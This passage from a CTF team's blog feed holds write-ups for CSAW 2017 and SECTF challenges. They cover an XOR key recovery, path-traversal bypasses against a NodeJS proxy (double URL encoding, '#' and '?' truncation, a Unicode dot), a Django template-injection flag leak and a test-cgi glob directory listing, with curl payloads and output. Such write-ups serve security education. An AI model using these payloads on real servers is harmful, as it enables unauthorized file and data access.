class="line">Partial key --&gt; A qua???????????????ixed ???? zinc???????????????very ????ht pa????</div><div class="line">Partial key --&gt; A qua?????? of o????ixed ???? zinc???????????????very ????ht pa????</div><div class="line">Partial key --&gt; A qua?????? of o????ixed ???? zinc?????? make????very ????ht pa????</div><div class="line">Partial key --&gt; A quart???? of o????ixed ???? zinc?????? make????very ????ht pa????</div><div class="line">Partial key --&gt; A quart???? of o????ixed ???? zinc o???? make????very ????ht pa????</div><div class="line">Partial key --&gt; A quart???? of o????ixed ???? zinc o???? make????very ????ht pain??</div><div class="line">Partial key --&gt; A quart???? of o????ixed wi?? zinc o???? make????very ????ht pain??</div><div class="line">Partial key --&gt; A quart???? of o????ixed wi?? zinc o???? make????very br??ht pain??</div><div class="line">Partial key --&gt; A quart???? of oil??ixed wi?? zinc o???? make????very br??ht pain??</div><div class="line">Partial key --&gt; A quart???? of oil??ixed wi?? zinc o???? makes ??very br??ht pain??</div><div class="line">Partial key --&gt; A quart j?? of oil??ixed wi?? zinc o???? makes ??very br??ht pain??</div><div class="line">Partial key --&gt; A quart j?? of oil??ixed wi?? zinc oxi?? makes ??very br??ht pain??</div><div class="line">Partial key --&gt; A quart j?? of oil??ixed wi?? zinc oxi?? makes ??very br??ht paint|</div><div class="line">Partial key --&gt; A quart j?? of oil??ixed with zinc oxi?? makes ??very br??ht paint|</div><div class="line">Partial key --&gt; A quart j?? of oil??ixed with zinc oxi?? makes ??very bright paint|</div><div class="line">Partial key --&gt; A quart j?? of oil mixed with zinc oxi?? makes ??very bright paint|</div><div class="line">Partial key --&gt; A quart j?? of oil mixed with zinc oxi?? makes a very bright paint|</div><div class="line">Partial key --&gt; A quart jar of oil mixed with zinc oxi?? makes a very bright paint|</div><div class="line">plaintext: flag&#123;sti11_us3_da_x0r_for_my_s3cratz&#125;|</div><div class="line">A quart jar of oil mixed with zinc oxide makes a very bright paint|</div></pre></td></tr></table></figure>
<p>Very nice challenge.</p>
]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;&lt;br&gt;Another Xor&lt;br&gt;Hey, hey can you find my secret.&lt;br&gt;&lt;br&gt;&lt;a href=&quot;https://ctf.csaw.io/files/ef303796b276cd0bdf4f7c61b2606df5/c
    
    </summary>
    
      <category term="Crypto" scheme="https://teamrocketist.github.io/categories/Crypto/"/>
    
    
      <category term="crypto" scheme="https://teamrocketist.github.io/tags/crypto/"/>
    
      <category term="xor" scheme="https://teamrocketist.github.io/tags/xor/"/>
    
      <category term="csaw" scheme="https://teamrocketist.github.io/tags/csaw/"/>
    
  </entry>
  
  <entry>
    <title>[Web] CSAW - orange v3</title>
    <link href="https://teamrocketist.github.io/2017/09/18/Web-CSAW-orange-v3/"/>
    <id>https://teamrocketist.github.io/2017/09/18/Web-CSAW-orange-v3/</id>
    <published>2017-09-18T03:48:13.000Z</published>
    <updated>2017-09-26T15:32:16.809Z</updated>
    
    <content type="html"><![CDATA[<blockquote><br>orange v3<br><br>I wrote a little proxy program in NodeJS for my poems folder but I’m bad at programming so I had to rewrite it. Again.<br><br>I changed up flag.txt too but everyone still wants to read it…<br><br><a href="http://web.chal.csaw.io:7312/?path=orange.txt" target="_blank" rel="external">http://web.chal.csaw.io:7312/?path=orange.txt</a><br></blockquote>

<p>Keep in mind I didn’t solve this challenge during the CTF but I was pretty close, the way to do this was to use unicode characters, I gave up in mid way after trying alot of characters and gave up and started thinking there was another way of bypassing the new filters! but It didn’t, the reason why I’m doing the writeup is to explain why some approaches don’t work and others do, this write up is based after reading <a href="https://aadityapurani.com/2017/09/17/csaw-ctf-2017-writeups/" target="_blank" rel="external">dcua writeup</a> , so all the credits go to them!</p>
<h3 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h3><p>Same problem as <a href="https://teamrocketist.github.io/2017/09/18/Web-CSAW-orange-v1/">orange v1</a> after testing a bunch of characters and see which ones were giving a 404 error BANNED and now our string must have “<strong>.txt</strong>“ at the end of the string so we are “stuck” into a one extension:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="string">r".|#|%"</span> <span class="comment"># --&gt; if the path GET parameter has any of this characters will return a 404</span></div></pre></td></tr></table></figure>
<p>Note that even null bytes don’t work here because the string must always end with “<strong>.txt</strong>“.</p>
<h3 id="Double-url-encoding-approach"><a href="#Double-url-encoding-approach" class="headerlink" title="Double url encoding approach"></a>Double url encoding approach</h3><p>Double url encoding no longer works and why? because the character “<strong>%</strong>“ is banned, so imagine that we try to inject this <strong>%202e</strong> the nodejs <strong>UrlParse</strong> function will decode it first into “<strong>%2e</strong>“ and the black list filter will block it because it contains a “<strong>%2e</strong>“!</p>
<h3 id="Why-are-they-banning-character"><a href="#Why-are-they-banning-character" class="headerlink" title="Why are they banning # character"></a>Why are they banning # character</h3><p>Remember the code from <a href="https://teamrocketist.github.io/2017/09/18/Web-CSAW-orange-v1/">orange v1</a>?</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> path = url.parse(req.url, <span class="literal">true</span>).query;</div><div class="line">path = path[<span class="string">'path'</span>];</div></pre></td></tr></table></figure>
<p>They are using url.parse! url parse in nodejs works the same way that php one works, here what happens when you add # character in php for example:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">$ php -r <span class="string">"var_dump(parse_url('web.chal.csaw.io:7312/?path=hi#.txt'));"</span></div><div class="line"><span class="keyword">array</span>(<span class="number">5</span>) &#123;</div><div class="line">  [<span class="string">"host"</span>]=&gt;</div><div class="line">  string(<span class="number">16</span>) <span class="string">"web.chal.csaw.io"</span></div><div class="line">  [<span class="string">"port"</span>]=&gt;</div><div class="line">  int(<span class="number">7312</span>)</div><div class="line">  [<span class="string">"path"</span>]=&gt;</div><div class="line">  string(<span class="number">1</span>) <span class="string">"/"</span></div><div class="line">  [<span class="string">"query"</span>]=&gt;</div><div class="line">  string(<span class="number">10</span>) <span class="string">"path=hello"</span></div><div class="line">  [<span class="string">"fragment"</span>]=&gt;</div><div class="line">  string(<span class="number">4</span>) <span class="string">".txt"</span></div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>You can see the trick? yes if the programmer uses the query parameter he’s fucked! everything after the ‘#’ will go to the field “<strong>fragment</strong>“! And the string won’t have the  “<strong>.txt</strong>“ in the end of the string!</p>
<p>Same thing in nodejs:</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> url = <span class="built_in">require</span>(<span class="string">'url'</span>);</div><div class="line"><span class="built_in">console</span>.log(url.parse(<span class="string">'web.chal.csaw.io:7312/?path=hi#.txt'</span>, <span class="literal">true</span>).query);</div><div class="line"><span class="comment">// &#123; path: 'hi' &#125;</span></div></pre></td></tr></table></figure>
<h3 id="Bypassing-the-extension-filter"><a href="#Bypassing-the-extension-filter" class="headerlink" title="Bypassing the extension filter"></a>Bypassing the extension filter</h3><p>Well if “#” removes everything after it how do we bypass the extension? well lets do the obvious lets encode “#”</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">$ curl <span class="string">'web.chal.csaw.io:7312/?path=%23.txt'</span></div><div class="line">&lt;!DOCTYPE html PUBLIC <span class="string">"-//W3C//DTD HTML 3.2 Final//EN"</span>&gt;&lt;html&gt;</div><div class="line">&lt;title&gt;Directory listing <span class="keyword">for</span> /poems/&lt;/title&gt;</div><div class="line">&lt;body&gt;</div><div class="line">&lt;h2&gt;Directory listing <span class="keyword">for</span> /poems/&lt;/h2&gt;</div><div class="line">&lt;hr&gt;</div><div class="line">&lt;ul&gt;</div><div class="line">&lt;li&gt;&lt;a href=<span class="string">"burger.txt"</span>&gt;burger.txt&lt;/a&gt;</div><div class="line">&lt;li&gt;&lt;a href=<span class="string">"haiku.txt"</span>&gt;haiku.txt&lt;/a&gt;</div><div class="line">&lt;li&gt;&lt;a href=<span class="string">"orange.txt"</span>&gt;orange.txt&lt;/a&gt;</div><div class="line">&lt;li&gt;&lt;a href=<span class="string">"ppp.txt"</span>&gt;ppp.txt&lt;/a&gt;</div><div class="line">&lt;li&gt;&lt;a href=<span class="string">"the_red_wheelbarrow.txt"</span>&gt;the_red_wheelbarrow.txt&lt;/a&gt;</div><div class="line">&lt;/ul&gt;</div><div class="line">&lt;hr&gt;</div><div class="line">&lt;/body&gt;</div><div class="line">&lt;/html&gt;</div></pre></td></tr></table></figure>
<p>It works! <strong>url.parse</strong> won’t remove the #, and after this nodejs will make a request at an url, and a GET request ignores everything after a #.<br>Now I will teach another way to bypass this but with another character “<strong>?</strong>“ or its url encoded version “<strong>%3F</strong>“:</p>
<p><strong>url.parse</strong> will do this:<br><figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> url = <span class="built_in">require</span>(<span class="string">'url'</span>);</div><div class="line"><span class="built_in">console</span>.log(url.parse(<span class="string">'web.chal.csaw.io:7312/?path=hi?.txt'</span>, <span class="literal">true</span>).query);</div><div class="line"><span class="comment">// &#123; path: 'hi?.txt' &#125;</span></div></pre></td></tr></table></figure></p>
<p>WTH? if it isn’t the url parse what is happening here? </p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> callback = <span class="function"><span class="keyword">function</span>(<span class="params">response</span>)</span>&#123;</div><div class="line"><span class="keyword">var</span> str = <span class="string">''</span>;</div><div class="line">response.on(<span class="string">'data'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">chunk</span>) </span>&#123;</div><div class="line">   str += chunk;</div><div class="line">&#125;);</div><div class="line">response.on(<span class="string">'end'</span>, <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</div><div class="line">   res.end(str);</div><div class="line">&#125;);</div><div class="line">&#125;;</div><div class="line">http.get(base + path, callback).end();</div></pre></td></tr></table></figure>
<p>Yap it’s the <strong>http.get</strong> function, yes a GET request will ignore everything that is after a <strong>?</strong> and this works because this isn’t Local File Inclusion function like <strong>include</strong> in php but a HTTP REQUEST! amazing isn’t it?</p>
<h3 id="Bypassing-the-“-“-filter"><a href="#Bypassing-the-“-“-filter" class="headerlink" title="Bypassing the “.“ filter"></a>Bypassing the “<strong>.</strong>“ filter</h3><p>Everything else is blocked so the only thing that is left is unicode! You could find all UTF-16 characters at <a href="http://www.fileformat.info/info/charset/UTF-16/list.htm" target="_blank" rel="external">here</a> and the character was this one <a href="http://www.fileformat.info/info/unicode/char/012e/index.htm" target="_blank" rel="external">http://www.fileformat.info/info/unicode/char/012e/index.htm</a> </p>
<p><img src="https://i.imgur.com/jOpFFkn.png" alt=""></p>
<p>It works! now getting the flag!</p>
<p><img src="https://i.imgur.com/hdPmEUf.png" alt=""></p>
]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;&lt;br&gt;orange v3&lt;br&gt;&lt;br&gt;I wrote a little proxy program in NodeJS for my poems folder but I’m bad at programming so I had to rewrite
    
    </summary>
    
      <category term="Web" scheme="https://teamrocketist.github.io/categories/Web/"/>
    
    
      <category term="csaw" scheme="https://teamrocketist.github.io/tags/csaw/"/>
    
      <category term="web" scheme="https://teamrocketist.github.io/tags/web/"/>
    
      <category term="lfi" scheme="https://teamrocketist.github.io/tags/lfi/"/>
    
      <category term="blackbox" scheme="https://teamrocketist.github.io/tags/blackbox/"/>
    
  </entry>
  
  <entry>
    <title>[Web] CSAW - orange v1</title>
    <link href="https://teamrocketist.github.io/2017/09/18/Web-CSAW-orange-v1/"/>
    <id>https://teamrocketist.github.io/2017/09/18/Web-CSAW-orange-v1/</id>
    <published>2017-09-17T23:13:50.000Z</published>
    <updated>2017-09-18T00:50:25.306Z</updated>
    
    <content type="html"><![CDATA[<blockquote><br>orange v1<br><br>I wrote a little proxy program in NodeJS for my poems folder.<br><br>Everyone wants to read flag.txt but I like it too much to share.<br><br><a href="http://web.chal.csaw.io:7311/?path=orange.txt" target="_blank" rel="external">http://web.chal.csaw.io:7311/?path=orange.txt</a><br></blockquote>

<p>We don’t have much here, its just a <strong>GET</strong> parameter, after a bunch of tries we realized that “..” characters are banned, so lets try with double encoding:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">$ curl <span class="string">'http://web.chal.csaw.io:7311/?path=%252e%252e/'</span></div><div class="line">&lt;!DOCTYPE html PUBLIC <span class="string">"-//W3C//DTD HTML 3.2 Final//EN"</span>&gt;&lt;html&gt;</div><div class="line">&lt;title&gt;Directory listing <span class="keyword">for</span> /poems/../&lt;/title&gt;</div><div class="line">&lt;body&gt;</div><div class="line">&lt;h2&gt;Directory listing <span class="keyword">for</span> /poems/../&lt;/h2&gt;</div><div class="line">&lt;hr&gt;</div><div class="line">&lt;ul&gt;</div><div class="line">&lt;li&gt;&lt;a href=<span class="string">".dockerignore"</span>&gt;.dockerignore&lt;/a&gt;</div><div class="line">&lt;li&gt;&lt;a href=<span class="string">"back.py"</span>&gt;back.py&lt;/a&gt;</div><div class="line">&lt;li&gt;&lt;a href=<span class="string">"flag.txt"</span>&gt;flag.txt&lt;/a&gt;</div><div class="line">&lt;li&gt;&lt;a href=<span class="string">"poems/"</span>&gt;poems/&lt;/a&gt;</div><div class="line">&lt;li&gt;&lt;a href=<span class="string">"serve.sh"</span>&gt;serve.sh&lt;/a&gt;</div><div class="line">&lt;li&gt;&lt;a href=<span class="string">"server.js"</span>&gt;server.js&lt;/a&gt;</div><div class="line">&lt;/ul&gt;</div><div class="line">&lt;hr&gt;</div><div class="line">&lt;/body&gt;</div><div class="line">&lt;/html&gt;</div></pre></td></tr></table></figure>
<p>And there it is the flag!</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$ curl <span class="string">'http://web.chal.csaw.io:7311/?path=%252e%252e/flag.txt'</span></div><div class="line">flag&#123;thank_you_based_orange_for_this_ctf_challenge&#125;</div></pre></td></tr></table></figure>
<p>Since we could leak the source code here ill post it:<br><figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> http = <span class="built_in">require</span>(<span class="string">'http'</span>);</div><div class="line"><span class="keyword">var</span> fs = <span class="built_in">require</span>(<span class="string">'fs'</span>);</div><div class="line"><span class="keyword">var</span> url = <span class="built_in">require</span>(<span class="string">'url'</span>);</div><div class="line"></div><div class="line"><span class="keyword">var</span> server = http.createServer(<span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</div><div class="line">    <span class="keyword">try</span> &#123;</div><div class="line">        <span class="keyword">var</span> path = url.parse(req.url, <span class="literal">true</span>).query;</div><div class="line">        path = path[<span class="string">'path'</span>];</div><div class="line">        <span class="keyword">if</span> (path.indexOf(<span class="string">".."</span>) == <span class="number">-1</span> &amp;&amp; path.indexOf(<span class="string">"ＮＮ"</span>) == <span class="number">-1</span>) &#123;</div><div class="line">            <span class="keyword">var</span> base = <span class="string">"http://localhost:8080/poems/"</span>;</div><div class="line">            <span class="keyword">var</span> callback = <span class="function"><span class="keyword">function</span>(<span class="params">response</span>)</span>&#123;</div><div class="line">                <span class="keyword">var</span> str = <span class="string">''</span>;</div><div class="line">                response.on(<span class="string">'data'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">chunk</span>) </span>&#123;</div><div class="line">                    str += chunk;</div><div class="line">                &#125;);</div><div class="line">                response.on(<span class="string">'end'</span>, <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</div><div class="line">                  res.end(str);</div><div class="line">                &#125;);</div><div class="line">            &#125;</div><div class="line">            http.get(base + path, callback).end();</div><div class="line">        &#125; <span class="keyword">else</span> &#123;</div><div class="line">            res.writeHead(<span class="number">403</span>);</div><div class="line">            res.end(<span class="string">"WHOA THATS BANNED!!!!"</span>);</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">catch</span> (e) &#123;</div><div class="line">        res.writeHead(<span class="number">404</span>);</div><div class="line">        res.end(<span class="string">'Oops'</span>);</div><div class="line">    &#125;</div><div class="line">&#125;);</div></pre></td></tr></table></figure></p>
]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;&lt;br&gt;orange v1&lt;br&gt;&lt;br&gt;I wrote a little proxy program in NodeJS for my poems folder.&lt;br&gt;&lt;br&gt;Everyone wants to read flag.txt but I 
    
    </summary>
    
      <category term="Web" scheme="https://teamrocketist.github.io/categories/Web/"/>
    
    
      <category term="csaw" scheme="https://teamrocketist.github.io/tags/csaw/"/>
    
      <category term="web" scheme="https://teamrocketist.github.io/tags/web/"/>
    
      <category term="lfi" scheme="https://teamrocketist.github.io/tags/lfi/"/>
    
  </entry>
  
  <entry>
    <title>[Web] CSAW - Shia Labeouf-off</title>
    <link href="https://teamrocketist.github.io/2017/09/17/Web-CSAW-Shia-Labeouf-off/"/>
    <id>https://teamrocketist.github.io/2017/09/17/Web-CSAW-Shia-Labeouf-off/</id>
    <published>2017-09-17T21:27:02.000Z</published>
    <updated>2017-09-25T05:07:04.332Z</updated>
    
    <content type="html"><![CDATA[<blockquote><br>Web<br>Shia Labeouf-off!<br><br>Do it<br><br>Just do it<br><br>Don’t let your dreams be dreams<br><br>Yesterday you said tomorrow<br><br>So just do it<br><br>Make your dreams come true<br><br>Just do it<br><br>Pick 1: <a href="http://web.chal.csaw.io:5487" target="_blank" rel="external">http://web.chal.csaw.io:5487</a> <a href="http://web.chal.csaw.io:5488" target="_blank" rel="external">http://web.chal.csaw.io:5488</a> <a href="http://web.chal.csaw.io:5489" target="_blank" rel="external">http://web.chal.csaw.io:5489</a> <a href="http://web.chal.csaw.io:5490" target="_blank" rel="external">http://web.chal.csaw.io:5490</a><br></blockquote>

<p>First of all great shout outs to CSAW for publishing a django challenge, even if it wasn’t a very hard one it was fun to do it.<br>Now going to the challenge, we know we have django debug mode enabled so lets try to generate some errors in the available webpages to see if we can leak some source code for example if we give an id in polls url we generate an exception:<br><a data-fancybox="gallery" href="https://i.imgur.com/xSLaeEE.png" target="_blank" rel="external"><br><img src="https://i.imgur.com/xSLaeEE.png" alt=""><br></a></p>
<p>If we scroll down a little bit and check those hidden tabs, we can find some leaked source code!</p>
<p><a data-fancybox="gallery" href="https://i.imgur.com/lGE0ewJ.png" target="_blank" rel="external"><br><img src="https://i.imgur.com/lGE0ewJ.png" alt=""><br></a></p>
<p>We have some nice custom made template filter tags! in django you can create custom tags and use it on templates, we have a function that lists the attributes(<code>listme</code>) of a python object one that gets attributes(<code>getme</code>):</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"><span class="meta">@register.filter(name='getme')</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">getme</span><span class="params">(value, arg)</span>:</span></div><div class="line">  <span class="keyword">return</span> getattr(value, arg)</div><div class="line"></div><div class="line"><span class="meta">@register.filter(name='checknum')</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">checknum</span><span class="params">(value)</span>:</span></div><div class="line">  check(value)</div><div class="line"><span class="meta">@register.filter(name='listme')</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">listme</span><span class="params">(value)</span>:</span></div><div class="line">  <span class="keyword">return</span> dir(value)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">check</span><span class="params">(value)</span>:</span></div><div class="line">  <span class="keyword">if</span> value &gt; <span class="number">2</span>:</div><div class="line">    <span class="keyword">raise</span> Exception(<span class="string">"Our infrastructure can't support that many Shias!"</span>)</div></pre></td></tr></table></figure>
<p>Now we need to find a Server-Side Template Injection (SSTI) so we can use this useful filters we can inject code with: </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">&#123;% expressions %&#125;</div><div class="line">&#123;&#123; arg1|filter:arg2 &#125;&#125;</div></pre></td></tr></table></figure>
<p>we can find one at <a href="http://web.chal.csaw.io:5490/ad-lib/" target="_blank" rel="external">http://web.chal.csaw.io:5490/ad-lib/</a> lets try to see the contents of debug variable:</p>
<h4 id="Query"><a href="#Query" class="headerlink" title="Query"></a>Query</h4><p><a data-fancybox="gallery" href="https://i.imgur.com/kpSR61D.png" target="_blank" rel="external"><br><img src="https://i.imgur.com/kpSR61D.png" alt=""><br></a></p>
<h4 id="Results"><a href="#Results" class="headerlink" title="Results"></a>Results</h4><p><a data-fancybox="gallery" href="https://i.imgur.com/FGjThVh.png" target="_blank" rel="external"><br><img src="https://i.imgur.com/FGjThVh.png" alt=""><br></a></p>
<p>Yap it works! the global debug leak alot of variables, mrpoopy object is interesting! lets check its attributes with the filter <code>listme</code></p>
<h4 id="Query-1"><a href="#Query-1" class="headerlink" title="Query"></a>Query</h4><p><a data-fancybox="gallery" href="https://i.imgur.com/q2lkMWY.png" target="_blank" rel="external"><br><img src="https://i.imgur.com/q2lkMWY.png" alt=""><br></a></p>
<h4 id="Response"><a href="#Response" class="headerlink" title="Response"></a>Response</h4><p><a data-fancybox="gallery" href="https://i.imgur.com/vfBMY9u.png" target="_blank" rel="external"><br><img src="https://i.imgur.com/vfBMY9u.png" alt=""><br></a></p>
<p>The flag must be in <code><strong>flag</strong></code>!! we need now to get this attribute with <code>getme</code> filter!</p>
<h4 id="Query-2"><a href="#Query-2" class="headerlink" title="Query"></a>Query</h4><p><a data-fancybox="gallery" href="https://i.imgur.com/yzNX42T.png" target="_blank" rel="external"><br><img src="https://i.imgur.com/yzNX42T.png" alt=""><br></a></p>
<h4 id="Response-1"><a href="#Response-1" class="headerlink" title="Response"></a>Response</h4><p><a data-fancybox="gallery" href="https://i.imgur.com/adBD7A4.png" target="_blank" rel="external"><br><img src="https://i.imgur.com/adBD7A4.png" alt=""><br></a></p>
]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;&lt;br&gt;Web&lt;br&gt;Shia Labeouf-off!&lt;br&gt;&lt;br&gt;Do it&lt;br&gt;&lt;br&gt;Just do it&lt;br&gt;&lt;br&gt;Don’t let your dreams be dreams&lt;br&gt;&lt;br&gt;Yesterday you said tom
    
    </summary>
    
      <category term="Web" scheme="https://teamrocketist.github.io/categories/Web/"/>
    
    
      <category term="python" scheme="https://teamrocketist.github.io/tags/python/"/>
    
      <category term="web" scheme="https://teamrocketist.github.io/tags/web/"/>
    
      <category term="pythonserver" scheme="https://teamrocketist.github.io/tags/pythonserver/"/>
    
      <category term="ssti" scheme="https://teamrocketist.github.io/tags/ssti/"/>
    
      <category term="django" scheme="https://teamrocketist.github.io/tags/django/"/>
    
  </entry>
  
  <entry>
    <title>[Web] SECTF - Sprinkler system</title>
    <link href="https://teamrocketist.github.io/2017/09/15/Web-SECTF-Sprinkler-system/"/>
    <id>https://teamrocketist.github.io/2017/09/15/Web-SECTF-Sprinkler-system/</id>
    <published>2017-09-15T19:36:03.000Z</published>
    <updated>2017-09-15T19:47:05.449Z</updated>
    
    <content type="html"><![CDATA[<blockquote><br><br>Sprinkler system - Web (100 + 0)<br><br>Damn new york… some chick tricked you into standing in the rain on the very first day… it’s payback time!<br><br>Solves: 238<br><br>Service: <a href="http://sprinklers.alieni.se/" target="_blank" rel="external">http://sprinklers.alieni.se/</a><br><br>Author: avlidienbrunn<br><br></blockquote>

<p>Starting by looking into robots.txt</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">curl <span class="string">'http://sprinklers.alieni.se/robots.txt'</span></div><div class="line">User-agent: *</div><div class="line">Disallow: /cgi-bin/<span class="built_in">test</span>-cgi</div></pre></td></tr></table></figure>
<p>We have a hidden directory /cgi-bin/test-cgi, my first instinct was to try shellshock but ofcourse it didn’t work so after a while searching in google I found this <a href="http://insecure.org/sploits/test-cgi.server_protocol.html" target="_blank" rel="external">http://insecure.org/sploits/test-cgi.server_protocol.html</a>.</p>
<p>To list the root directory we can do this:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line">curl <span class="string">'http://sprinklers.alieni.se/cgi-bin/test-cgi?/*'</span></div><div class="line">CGI/1.0 <span class="built_in">test</span> script report:</div><div class="line"></div><div class="line">argc is 1. argv is /\*.</div><div class="line"></div><div class="line">SERVER_SOFTWARE = Apache/2.4.18 (Ubuntu)</div><div class="line">SERVER_NAME = sprinklers.alieni.se</div><div class="line">GATEWAY_INTERFACE = CGI/1.1</div><div class="line">SERVER_PROTOCOL = HTTP/1.1</div><div class="line">SERVER_PORT = 80</div><div class="line">REQUEST_METHOD = GET</div><div class="line">HTTP_ACCEPT = */*</div><div class="line">PATH_INFO = </div><div class="line">PATH_TRANSLATED = </div><div class="line">SCRIPT_NAME = /cgi-bin/<span class="built_in">test</span>-cgi</div><div class="line">QUERY_STRING = /app /bin /boot /dev /etc /git /home /lib /lib64 /media /mnt /opt /proc /root /run /sbin /srv /sys /tmp /usr /var</div><div class="line">REMOTE_HOST =</div><div class="line">REMOTE_ADDR = 172.68.102.79</div><div class="line">REMOTE_USER =</div><div class="line">AUTH_TYPE =</div><div class="line">CONTENT_TYPE =</div><div class="line">CONTENT_LENGTH =</div></pre></td></tr></table></figure></p>
<p>Nothing special on the root directory lets try to list the current directory to instead of doing ?/<em> lets try ?</em> at the end of the url:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line">$ curl <span class="string">'http://sprinklers.alieni.se/cgi-bin/test-cgi?*'</span></div><div class="line">CGI/1.0 <span class="built_in">test</span> script report:</div><div class="line"></div><div class="line">argc is 1. argv is \*.</div><div class="line"></div><div class="line">SERVER_SOFTWARE = Apache/2.4.18 (Ubuntu)</div><div class="line">SERVER_NAME = sprinklers.alieni.se</div><div class="line">GATEWAY_INTERFACE = CGI/1.1</div><div class="line">SERVER_PROTOCOL = HTTP/1.1</div><div class="line">SERVER_PORT = 80</div><div class="line">REQUEST_METHOD = GET</div><div class="line">HTTP_ACCEPT = */*</div><div class="line">PATH_INFO = </div><div class="line">PATH_TRANSLATED = </div><div class="line">SCRIPT_NAME = /cgi-bin/<span class="built_in">test</span>-cgi</div><div class="line">QUERY_STRING = enable_sprinkler_system <span class="built_in">test</span>-cgi</div><div class="line">REMOTE_HOST =</div><div class="line">REMOTE_ADDR = 172.68.102.79</div><div class="line">REMOTE_USER =</div><div class="line">AUTH_TYPE =</div><div class="line">CONTENT_TYPE =</div><div class="line">CONTENT_LENGTH</div></pre></td></tr></table></figure>
<p>It works! there is a file named enable_sprinkler_system! lets see what is its content:<br><img src="https://i.imgur.com/0I4PAX0.png" alt=""></p>
]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;&lt;br&gt;&lt;br&gt;Sprinkler system - Web (100 + 0)&lt;br&gt;&lt;br&gt;Damn new york… some chick tricked you into standing in the rain on the very firs
    
    </summary>
    
